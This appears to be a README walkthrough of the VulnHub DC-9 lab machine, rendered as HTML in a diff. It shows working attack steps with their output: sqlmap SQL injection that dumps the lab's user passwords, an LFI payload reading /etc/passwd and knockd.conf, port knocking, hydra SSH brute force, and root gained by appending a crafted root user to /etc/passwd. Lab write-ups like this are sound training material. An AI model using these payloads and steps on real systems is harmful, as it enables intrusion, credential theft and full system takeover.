@@ -1,0 +1,419 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md (sqlmap,hydra, open filtered port with port knocking method)</title>
+</head><body>IP - 10.0.2.33<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_9]<br/>
+└─# nmap -sC -sV 10.0.2.33 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 05:53 +0630<br/>
+Nmap scan report for 10.0.2.33<br/>
+Host is up (0.00010s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE &nbsp; &nbsp;SERVICE VERSION<br/>
+22/tcp filtered ssh<br/>
+80/tcp open &nbsp; &nbsp; http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Example.com - Staff Details - Welcome<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:DB:FB:76 (Oracle VirtualBox virtual NIC)<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+dirsearch result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://10.0.2.33/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2<br/>
+&nbsp;(_||| _) (/_(_|| (_| )<br/>
+<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/10.0.2.33/-_23-02-20_05-55-11.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-02-20_05-55-11.log<br/>
+<br/>
+Target: http://10.0.2.33/<br/>
+<br/>
+[05:55:11] Starting: <br/>
+[05:55:24] 200 - &nbsp; &nbsp;0B &nbsp;- /config.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:25] 200 - &nbsp;928B &nbsp;- /css/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:25] 301 - &nbsp;304B &nbsp;- /css &nbsp;-&gt; &nbsp;http://10.0.2.33/css/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:26] 200 - &nbsp; &nbsp;3KB - /display.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[05:55:29] 301 - &nbsp;309B &nbsp;- /includes &nbsp;-&gt; &nbsp;http://10.0.2.33/includes/ &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:29] 200 - &nbsp;742B &nbsp;- /includes/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[05:55:29] 200 - &nbsp;917B &nbsp;- /index.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[05:55:30] 200 - &nbsp;917B &nbsp;- /index.php/login/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:32] 302 - &nbsp; &nbsp;0B &nbsp;- /logout.php &nbsp;-&gt; &nbsp;manage.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:32] 200 - &nbsp; &nbsp;1KB - /manage.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:38] 200 - &nbsp; &nbsp;1KB - /results.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[05:55:39] 200 - &nbsp; &nbsp;1KB - /search.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[05:55:39] 302 - &nbsp; &nbsp;0B &nbsp;- /session.php &nbsp;-&gt; &nbsp;manage.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Task Completed<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+SQL Injection (with sqlmap)<br/>
+<br/>
+http://10.0.2.33/search.php (SQL Injection Vulnerable page)<br/>
+<br/>
+I save below request with burpsuite<br/>
+<br/>
+Request:<br/>
+<br/>
+POST /results.php HTTP/1.1<br/>
+Host: 10.0.2.33<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br/>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Accept-Encoding: gzip, deflate<br/>
+Content-Type: application/x-www-form-urlencoded<br/>
+Content-Length: 13<br/>
+Origin: http://10.0.2.33<br/>
+Connection: close<br/>
+Referer: http://10.0.2.33/search.php<br/>
+Upgrade-Insecure-Requests: 1<br/>
+<br/>
+search=Donald<br/>
+<br/>
+<br/>
+run sqlmap:<br/>
+<br/>
+┌──(root㉿kali)-[/tmp]<br/>
+└─# sqlmap -r request.txt --dbs --batch<br/>
+<br/>
+sqlmap result<br/>
+<br/>
+[06:08:45] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable<br/>
+POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N<br/>
+sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:<br/>
+---<br/>
+Parameter: search (POST)<br/>
+&nbsp; &nbsp; Type: boolean-based blind<br/>
+&nbsp; &nbsp; Title: AND boolean-based blind - WHERE or HAVING clause<br/>
+&nbsp; &nbsp; Payload: search=Donald' AND 8482=8482 AND 'QxQP'='QxQP<br/>
+<br/>
+&nbsp; &nbsp; Type: time-based blind<br/>
+&nbsp; &nbsp; Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br/>
+&nbsp; &nbsp; Payload: search=Donald' AND (SELECT 5515 FROM (SELECT(SLEEP(5)))EPJG) AND 'COBK'='COBK<br/>
+<br/>
+&nbsp; &nbsp; Type: UNION query<br/>
+&nbsp; &nbsp; Title: Generic UNION query (NULL) - 6 columns<br/>
+&nbsp; &nbsp; Payload: search=Donald' UNION ALL SELECT NULL,CONCAT(0x716a6b6271,0x657279664a63724870486746546679737555526b46616a4d45424c4c66636f7144504b4342794543,0x7171767071),NULL,NULL,NULL,NULL-- -<br/>
+---<br/>
+[06:08:45] [INFO] the back-end DBMS is MySQL<br/>
+web server operating system: Linux Debian 10 (buster)<br/>
+web application technology: Apache 2.4.38<br/>
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br/>
+[06:08:45] [INFO] fetching database names<br/>
+available databases [3]:<br/>
+[*] information_schema<br/>
+[*] Staff<br/>
+[*] users<br/>
+<br/>
+[06:08:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.33'<br/>
+<br/>
+[*] ending @ 06:08:45 /2023-02-20/<br/>
+<br/>
+<br/>
+Retrieve Data from users database:<br/>
+<br/>
+sqlmap -r request.txt -D users --columns --batch<br/>
+<br/>
+[06:12:44] [INFO] fetching columns for table 'UserDetails' in database 'users'<br/>
+Database: users<br/>
+Table: UserDetails<br/>
+[6 columns]<br/>
++-----------+-----------------+<br/>
+| Column &nbsp; &nbsp;| Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++-----------+-----------------+<br/>
+| firstname | varchar(30) &nbsp; &nbsp; |<br/>
+| id &nbsp; &nbsp; &nbsp; &nbsp;| int(6) unsigned |<br/>
+| lastname &nbsp;| varchar(30) &nbsp; &nbsp; |<br/>
+| password &nbsp;| varchar(20) &nbsp; &nbsp; |<br/>
+| reg_date &nbsp;| timestamp &nbsp; &nbsp; &nbsp; |<br/>
+| username &nbsp;| varchar(30) &nbsp; &nbsp; |<br/>
++-----------+-----------------+<br/>
+<br/>
+[06:12:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.33'<br/>
+<br/>
+[*] ending @ 06:12:44 /2023-02-20/<br/>
+<br/>
+<br/>
+Dump data from UserDetails table:<br/>
+<br/>
+sqlmap -r request.txt --dump -T "UserDetails" -D "users" --batch<br/>
+<br/>
+[06:13:57] [INFO] fetching entries for table 'UserDetails' in database 'users'<br/>
+Database: users<br/>
+Table: UserDetails<br/>
+[17 entries]<br/>
++----+------------+---------------+---------------------+-----------+-----------+<br/>
+| id | lastname &nbsp; | password &nbsp; &nbsp; &nbsp;| reg_date &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| username &nbsp;| firstname |<br/>
++----+------------+---------------+---------------------+-----------+-----------+<br/>
+| 1 &nbsp;| Moe &nbsp; &nbsp; &nbsp; &nbsp;| 3kfs86sfd &nbsp; &nbsp; | 2019-12-29 16:58:26 | marym &nbsp; &nbsp; | Mary &nbsp; &nbsp; &nbsp;|<br/>
+| 2 &nbsp;| Dooley &nbsp; &nbsp; | 468sfdfsd2 &nbsp; &nbsp;| 2019-12-29 16:58:26 | julied &nbsp; &nbsp;| Julie &nbsp; &nbsp; |<br/>
+| 3 &nbsp;| Flintstone | 4sfd87sfd1 &nbsp; &nbsp;| 2019-12-29 16:58:26 | fredf &nbsp; &nbsp; | Fred &nbsp; &nbsp; &nbsp;|<br/>
+| 4 &nbsp;| Rubble &nbsp; &nbsp; | RocksOff &nbsp; &nbsp; &nbsp;| 2019-12-29 16:58:26 | barneyr &nbsp; | Barney &nbsp; &nbsp;|<br/>
+| 5 &nbsp;| Cat &nbsp; &nbsp; &nbsp; &nbsp;| TC&amp;TheBoyz &nbsp; &nbsp;| 2019-12-29 16:58:26 | tomc &nbsp; &nbsp; &nbsp;| Tom &nbsp; &nbsp; &nbsp; |<br/>
+| 6 &nbsp;| Mouse &nbsp; &nbsp; &nbsp;| B8m#48sd &nbsp; &nbsp; &nbsp;| 2019-12-29 16:58:26 | jerrym &nbsp; &nbsp;| Jerry &nbsp; &nbsp; |<br/>
+| 7 &nbsp;| Flintstone | Pebbles &nbsp; &nbsp; &nbsp; | 2019-12-29 16:58:26 | wilmaf &nbsp; &nbsp;| Wilma &nbsp; &nbsp; |<br/>
+| 8 &nbsp;| Rubble &nbsp; &nbsp; | BamBam01 &nbsp; &nbsp; &nbsp;| 2019-12-29 16:58:26 | bettyr &nbsp; &nbsp;| Betty &nbsp; &nbsp; |<br/>
+| 9 &nbsp;| Bing &nbsp; &nbsp; &nbsp; | UrAG0D! &nbsp; &nbsp; &nbsp; | 2019-12-29 16:58:26 | chandlerb | Chandler &nbsp;|<br/>
+| 10 | Tribbiani &nbsp;| Passw0rd &nbsp; &nbsp; &nbsp;| 2019-12-29 16:58:26 | joeyt &nbsp; &nbsp; | Joey &nbsp; &nbsp; &nbsp;|<br/>
+| 11 | Green &nbsp; &nbsp; &nbsp;| yN72#dsd &nbsp; &nbsp; &nbsp;| 2019-12-29 16:58:26 | rachelg &nbsp; | Rachel &nbsp; &nbsp;|<br/>
+| 12 | Geller &nbsp; &nbsp; | ILoveRachel &nbsp; | 2019-12-29 16:58:26 | rossg &nbsp; &nbsp; | Ross &nbsp; &nbsp; &nbsp;|<br/>
+| 13 | Geller &nbsp; &nbsp; | 3248dsds7s &nbsp; &nbsp;| 2019-12-29 16:58:26 | monicag &nbsp; | Monica &nbsp; &nbsp;|<br/>
+| 14 | Buffay &nbsp; &nbsp; | smellycats &nbsp; &nbsp;| 2019-12-29 16:58:26 | phoebeb &nbsp; | Phoebe &nbsp; &nbsp;|<br/>
+| 15 | McScoots &nbsp; | YR3BVxxxw87 &nbsp; | 2019-12-29 16:58:26 | scoots &nbsp; &nbsp;| Scooter &nbsp; |<br/>
+| 16 | Trump &nbsp; &nbsp; &nbsp;| Ilovepeepee &nbsp; | 2019-12-29 16:58:26 | janitor &nbsp; | Donald &nbsp; &nbsp;|<br/>
+| 17 | Morrison &nbsp; | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2 &nbsp;| Scott &nbsp; &nbsp; |<br/>
++----+------------+---------------+---------------------+-----------+-----------+<br/>
+<br/>
+[06:13:57] [INFO] table 'users.UserDetails' dumped to CSV file '/root/.local/share/sqlmap/output/10.0.2.33/dump/users/UserDetails.csv'<br/>
+[06:13:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.33'<br/>
+<br/>
+[*] ending @ 06:13:57 /2023-02-20/<br/>
+<br/>
+Retrieve Data from Staff database:<br/>
+<br/>
+sqlmap -r request.txt -D Staff --columns --batch<br/>
+<br/>
+[06:17:22] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'<br/>
+Database: Staff<br/>
+Table: Users<br/>
+[3 columns]<br/>
++----------+-----------------+<br/>
+| Column &nbsp; | Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++----------+-----------------+<br/>
+| Password | varchar(255) &nbsp; &nbsp;|<br/>
+| UserID &nbsp; | int(6) unsigned |<br/>
+| Username | varchar(255) &nbsp; &nbsp;|<br/>
++----------+-----------------+<br/>
+<br/>
+Database: Staff<br/>
+Table: StaffDetails<br/>
+[7 columns]<br/>
++-----------+-----------------+<br/>
+| Column &nbsp; &nbsp;| Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++-----------+-----------------+<br/>
+| position &nbsp;| varchar(100) &nbsp; &nbsp;|<br/>
+| email &nbsp; &nbsp; | varchar(50) &nbsp; &nbsp; |<br/>
+| firstname | varchar(30) &nbsp; &nbsp; |<br/>
+| id &nbsp; &nbsp; &nbsp; &nbsp;| int(6) unsigned |<br/>
+| lastname &nbsp;| varchar(30) &nbsp; &nbsp; |<br/>
+| phone &nbsp; &nbsp; | varchar(20) &nbsp; &nbsp; |<br/>
+| reg_date &nbsp;| timestamp &nbsp; &nbsp; &nbsp; |<br/>
++-----------+-----------------+<br/>
+<br/>
+[06:17:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.33'<br/>
+<br/>
+[*] ending @ 06:17:22 /2023-02-20/<br/>
+<br/>
+<br/>
+Dump data from Users table:<br/>
+<br/>
+sqlmap -r request.txt --dump -T "Users" -D "Staff" --batch<br/>
+<br/>
+[06:17:55] [WARNING] no clear password(s) found &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Database: Staff<br/>
+Table: Users<br/>
+[1 entry]<br/>
++--------+----------------------------------+----------+<br/>
+| UserID | Password &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | Username |<br/>
++--------+----------------------------------+----------+<br/>
+| 1 &nbsp; &nbsp; &nbsp;| 856f5de590ef37314e7c3bdf6f8a66dc | admin &nbsp; &nbsp;|<br/>
++--------+----------------------------------+----------+<br/>
+<br/>
+[06:17:55] [INFO] table 'Staff.Users' dumped to CSV file '/root/.local/share/sqlmap/output/10.0.2.33/dump/Staff/Users.csv'<br/>
+[06:17:55] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.33'<br/>
+<br/>
+[*] ending @ 06:17:55 /2023-02-20/<br/>
+<br/>
+<br/>
+<br/>
+Username - admin<br/>
+Password - transorbital1<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+LFI Vulnerability found at here:<br/>
+<br/>
+http://192.168.178.209/manage.php<br/>
+<br/>
+payload = http://192.168.178.209/manage.php?file=../../../../etc/passwd<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Filter port knocking Method (In here port 22)<br/>
+<br/>
+Step 1:<br/>
+<br/>
+In this box I can read system file with LFI vulnerability so I need to check which port number do I need to open ssh port.<br/>
+<br/>
+<br/>
+http://192.168.178.209/manage.php?file=../../../../etc/knockd.conf<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Found 3 ports to knock:<br/>
+<br/>
+7469,8475,9842<br/>
+<br/>
+[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn <br/>
+<br/>
+Step 3:<br/>
+<br/>
+Knock these port with "nc":<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -v 192.168.178.209 22<br/>
+192.168.178.209: inverse host lookup failed: Unknown host<br/>
+(UNKNOWN) [192.168.178.209] 22 (ssh) : Connection refused (As you can see connection is closed.)<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -v 192.168.178.209 7469<br/>
+192.168.178.209: inverse host lookup failed: Unknown host<br/>
+(UNKNOWN) [192.168.178.209] 7469 (?) : Connection refused<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -v 192.168.178.209 8475<br/>
+192.168.178.209: inverse host lookup failed: Unknown host<br/>
+(UNKNOWN) [192.168.178.209] 8475 (?) : Connection refused<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -v 192.168.178.209 9842<br/>
+192.168.178.209: inverse host lookup failed: Unknown host<br/>
+(UNKNOWN) [192.168.178.209] 9842 (?) : Connection refused<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -v 192.168.178.209 22 &nbsp;<br/>
+192.168.178.209: inverse host lookup failed: Unknown host<br/>
+(UNKNOWN) [192.168.178.209] 22 (ssh) open<br/>
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1<br/>
+<br/>
+Boom! now ssh port is open.<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I got ssh credential from database users<br/>
+<br/>
+username - chandlerb<br/>
+password - UrAG0D!<br/>
+<br/>
+username - joeyt<br/>
+password - Passw0rd<br/>
+<br/>
+username - janitor<br/>
+password - Ilovepeepee<br/>
+<br/>
+username - fredf<br/>
+password - B4-Tru3-001<br/>
+<br/>
+Juicy infomation from janitor:<br/>
+<br/>
+janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt <br/>
+BamBam01<br/>
+Passw0rd<br/>
+smellycats<br/>
+P0Lic#10-4<br/>
+B4-Tru3-001<br/>
+4uGU5T-NiGHts<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_9]<br/>
+└─# hydra -L username.txt -P password.txt 10.0.2.33 ssh <br/>
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br/>
+<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-20 06:48:33<br/>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br/>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task<br/>
+[DATA] attacking ssh://10.0.2.33:22/<br/>
+[22][ssh] host: 10.0.2.33 &nbsp; login: fredf &nbsp; password: B4-Tru3-001<br/>
+[22][ssh] host: 10.0.2.33 &nbsp; login: joeyt &nbsp; password: Passw0rd<br/>
+1 of 1 target successfully completed, 2 valid passwords found<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-20 06:48:56<br/>
+<br/>
+username - fredf<br/>
+password - B4-Tru3-001<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation ((root) NOPASSWD: /opt/devstuff/dist/test/test)<br/>
+<br/>
+I execute sudo -l with "fredf" account and found out that I can this python file called "test". This python program will read the file first file and append it into whatever file that I want to append so I abusive this program to add new user as root.<br/>
+<br/>
+Step 1:<br/>
+<br/>
+create grenerate openssl in kali machine<br/>
+<br/>
+openssl passwd -1 -salt ignite pass123<br/>
+$1$ignite$3eTbJm98O9Hz.k1NTdNxe1<br/>
+<br/>
+Step 2:<br/>
+<br/>
+create new passwd file and paste the new openssl with new username at /tmp directory in victim machine<br/>
+<br/>
+fredf@dc-9:/tmp$ nano passwd <br/>
+<br/>
+noone:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash<br/>
+<br/>
+Step 3:<br/>
+<br/>
+run the program with sudo<br/>
+<br/>
+fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test "/tmp/passwd" "/etc/passwd"<br/>
+<br/>
+Step 4:<br/>
+<br/>
+Swith user noone and boom! now, I'm root.<br/>
+<br/>
+fredf@dc-9:/tmp$ su noone<br/>
+Password: <br/>
+root@dc-9:/tmp# whoami<br/>
+root<br/>
+<br/>
+Vulnhub Flag<br/>
+<br/>
+root@dc-9:~# cat theflag.txt <br/>
+<br/>
+<br/>
+███╗ &nbsp; ██╗██╗ ██████╗███████╗ &nbsp; &nbsp;██╗ &nbsp; &nbsp;██╗ ██████╗ ██████╗ ██╗ &nbsp;██╗██╗██╗██╗<br/>
+████╗ &nbsp;██║██║██╔════╝██╔════╝ &nbsp; &nbsp;██║ &nbsp; &nbsp;██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║<br/>
+██╔██╗ ██║██║██║ &nbsp; &nbsp; █████╗ &nbsp; &nbsp; &nbsp;██║ █╗ ██║██║ &nbsp; ██║██████╔╝█████╔╝ ██║██║██║<br/>
+██║╚██╗██║██║██║ &nbsp; &nbsp; ██╔══╝ &nbsp; &nbsp; &nbsp;██║███╗██║██║ &nbsp; ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝<br/>
+██║ ╚████║██║╚██████╗███████╗ &nbsp; &nbsp;╚███╔███╔╝╚██████╔╝██║ &nbsp;██║██║ &nbsp;██╗██╗██╗██╗<br/>
+╚═╝ &nbsp;╚═══╝╚═╝ ╚═════╝╚══════╝ &nbsp; &nbsp; ╚══╝╚══╝ &nbsp;╚═════╝ ╚═╝ &nbsp;╚═╝╚═╝ &nbsp;╚═╝╚═╝╚═╝╚═╝<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Congratulations - you have done well to get to this point.<br/>
+<br/>
+Hope you enjoyed DC-9. &nbsp;Just wanted to send out a big thanks to all those<br/>
+who have taken the time to complete the various DC challenges.<br/>
+<br/>
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .<br/>
+<br/>
+They are an inspirational bunch of fellows.<br/>
+<br/>
+Sure, they might smell a bit, but...just kidding. &nbsp;:-)<br/>
+<br/>
+Sadly, all things must come to an end, and this will be the last ever<br/>
+challenge in the DC series.<br/>
+<br/>
+So long, and thanks for all the fish.<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
